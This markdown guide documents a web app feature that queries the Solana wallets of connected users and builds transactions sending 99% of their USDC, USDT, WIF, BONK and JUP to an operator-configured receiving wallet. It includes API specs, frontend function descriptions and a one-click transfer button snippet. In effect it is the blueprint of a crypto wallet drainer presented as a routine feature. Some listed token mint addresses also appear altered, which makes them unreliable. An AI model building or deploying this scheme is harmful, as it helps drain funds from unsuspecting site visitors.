# Token Transfer Feature Guide

This guide explains how to use the newly implemented feature to transfer 99% of specific tokens (USDC, USDT, WIF, BONK, JUP) from connected user wallets.

## Overview

The token transfer system allows you to:
1. **Query token balances** for USDC, USDT, WIF, BONK, and JUP tokens
2. **Transfer 99% of these tokens** to a specified destination address
3. **Manage token transfers** securely using Phantom wallet signing

## Architecture

### Backend Endpoints

All endpoints are prefixed with `/api/solana/`

#### 1. GET `/token-balances`
Fetches the current balances of all supported tokens for a wallet.

**Query Parameters:**
- `publicKey` (required): The wallet address to check balances for

**Response:**
```json
{
  "publicKey": "...",
  "balances": {
    "USDC": {
      "balance": 100.5,
      "decimals": 6,
      "mint": "EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g",
      "account": "..."
    },
    "USDT": { ... },
    "WIF": { ... },
    "BONK": { ... },
    "JUP": { ... }
  }
}
```

#### 2. POST `/transfer-tokens-99percent`
Prepares a transaction to transfer 99% of specified tokens to a destination address.

**Request Body:**
```json
{
  "sourcePublicKey": "...",
  "destinationAddress": "...",
  "tokens": ["USDC", "USDT", "WIF", "BONK", "JUP"]
}
```

**Response:**
```json
{
  "status": "ready_for_signing",
  "message": "Transaction prepared. Please sign with your wallet.",
  "transaction": "base64_encoded_transaction",
  "transfers": [
    {
      "token": "USDC",
      "amount": 99500000,
      "decimals": 6,
      "percentage": 99,
      "status": "ready"
    },
    ...
  ],
  "blockhash": "...",
  "sourcePublicKey": "...",
  "destinationAddress": "..."
}
```

#### 3. POST `/send-signed-transaction`
Sends a signed transaction to the blockchain.

**Request Body:**
```json
{
  "signedTransaction": "base64_encoded_signed_transaction"
}
```

**Response:**
```json
{
  "success": true,
  "signature": "transaction_signature",
  "message": "Transaction sent and confirmed"
}
```

### Frontend Functions

#### Available Functions in `wallet.js`

1. **`connectWallet()`**
   - Connects to Phantom wallet
   - Automatically fetches and displays token balances
   - Sets `window.walletAddress` global variable

2. **`fetchTokenBalances(walletAddress)`**
   - Fetches current token balances for a wallet
   - Displays balances in the UI if element with id `tokenBalances` exists
   - Returns balance object

3. **`transfer99PercentTokens(destinationAddress, tokens)`**
   - Initiates transfer of 99% of tokens to destination
   - Signs transaction with Phantom wallet
   - Sends signed transaction to server
   - Parameters:
     - `destinationAddress`: Where to send the tokens
     - `tokens`: Array of token symbols (default: all 5 tokens)

4. **`autoTransfer99Percent()`**
   - Quick action function that transfers to a preset address
   - Uses `RECEIVING_WALLET` from environment config
   - Requires user confirmation before executing

## Setup Instructions

### 1. Environment Configuration

Update your `.env` file with:

```env
# Solana RPC URL
SOLANA_RPC_URL='https://api.devnet.solana.com'  # or mainnet

# Destination wallet for token transfers
RECEIVING_WALLET='YOUR_WALLET_ADDRESS_HERE'
```

### 2. Install Dependencies

The required dependency is already in `package.json`:
```bash
npm install
```

Make sure `@solana/spl-token` is installed:
```bash
npm install @solana/spl-token@0.4.0
```

### 3. Update Your HTML

Add a transfer button and balance display area to your HTML file (e.g., `wallet.html`):

```html
<!-- Token Balance Display -->
<div id="tokenBalances" style="margin: 20px; padding: 10px; border: 1px solid #ccc;"></div>

<!-- Transfer Button -->
<button onclick="autoTransfer99Percent()" style="padding: 10px 20px; background: #ff6b6b; color: white; border: none; border-radius: 4px; cursor: pointer;">
  Transfer 99% of Tokens
</button>

<!-- Or with custom destination -->
<button onclick="transfer99PercentTokens('YOUR_DESTINATION_ADDRESS')" style="padding: 10px 20px; background: #4ecdc4; color: white; border: none; border-radius: 4px; cursor: pointer;">
  Custom Transfer
</button>

<!-- Include wallet.js -->
<script src="js/wallet.js"></script>
```

## Usage Examples

### Example 1: Fetch Token Balances

```javascript
const balances = await fetchTokenBalances('wallet_address');
console.log(balances);
```

### Example 2: Transfer 99% of All Tokens

```javascript
await transfer99PercentTokens('destination_wallet_address');
```

### Example 3: Transfer 99% of Specific Tokens Only

```javascript
await transfer99PercentTokens(
  'destination_wallet_address',
  ['USDC', 'USDT']  // Only transfer USDC and USDT
);
```

### Example 4: Auto Transfer Using Config

```javascript
// Make sure RECEIVING_WALLET is set in .env
await autoTransfer99Percent();
```

## Token Mint Addresses

The system supports these token mints (mainnet):

| Token | Mint Address |
|-------|--------------|
| USDC | `EPjFWaZn5XcjYnFoV1CfgkqvDzH6YFxZ1SVbq1X4Y8g` |
| USDT | `Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BehQbB` |
| WIF | `EchesZ568R9UgZVnEShZ4A5YjXVWiXrEFPNxgMW1Ckv` |
| BONK | `DezXAZ8z7PnrnRJjz3wXBoRgixVqtzj84hJ8tuccb9Qg` |
| JUP | `JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZwrCk7xKc68b` |

**Note:** On devnet, these addresses might be different. Update the `TOKEN_MINTS` object in `solana-wallet-routes.js` if needed.

## Security Considerations

1. **Wallet Signing**: All transactions are signed by the user's Phantom wallet. The server never has access to private keys.

2. **Transaction Verification**: Always verify the transaction details before signing in your wallet.

3. **Destination Address Validation**: The destination address must have associated token accounts for each token, or the transaction will fail.

4. **Transaction Confirmation**: The system waits for `confirmed` status before reporting success.

## Error Handling

The system handles various error scenarios:

- **No token account**: If user doesn't have a token account, the balance will show as 0
- **Destination account missing**: If the destination doesn't have a token account for a specific token, that transfer will be skipped
- **Low balance**: Transfers with amounts less than 1 unit will be skipped
- **Network errors**: Server-side errors are caught and reported to the user

## Troubleshooting

### Issue: "Phantom wallet not found"
- Ensure Phantom wallet extension is installed in your browser
- Check that you're using a compatible browser (Chrome, Firefox, Brave, Edge)

### Issue: "Transaction not found"
- Wait a moment and try again
- Ensure the wallet has sufficient SOL for transaction fees
- Check network status at [Solana Status](https://status.solana.com/)

### Issue: "Destination token account does not exist"
- The destination wallet needs to have the token account created first
- Create token accounts through a wallet like Phantom or Solflare

### Issue: "Failed to get token balances"
- Check that the wallet address is valid
- Verify RPC URL in `.env` is correct
- Ensure the wallet has been used on the network (has some SOL for fees)

## Testing on Devnet

To test on devnet:

1. Update `.env`:
   ```env
   SOLANA_RPC_URL='https://api.devnet.solana.com'
   ```

2. Get devnet tokens from the faucet:
   ```bash
   solana airdrop 2 --url devnet  # Get 2 SOL
   ```

3. Create test wallets and accounts as needed

## Advanced Configuration

To modify supported tokens, edit `TOKEN_MINTS` in `bin/server/routes/solana-wallet-routes.js`:

```javascript
const TOKEN_MINTS = {
  USDC: 'your_mint_address',
  USDT: 'your_mint_address',
  // Add more tokens here
};
```

## API Rate Limits

- Solana RPC: Check your RPC provider's limits
- Recommended: Implement client-side caching of balances

## Performance Notes

- First transfer preparation may take 2-5 seconds due to token account lookups
- Transaction confirmation typically takes 10-30 seconds
- Batch operations are supported (transferring multiple tokens in one transaction)

## Additional Resources

- [Solana Web3.js Documentation](https://docs.solana.com/de/developing/clients/javascript-reference)
- [SPL Token Program](https://github.com/solana-labs/solana-program-library/tree/master/token)
- [Phantom Wallet API](https://docs.phantom.app/)

---

**Last Updated:** May 2026
**Version:** 1.0
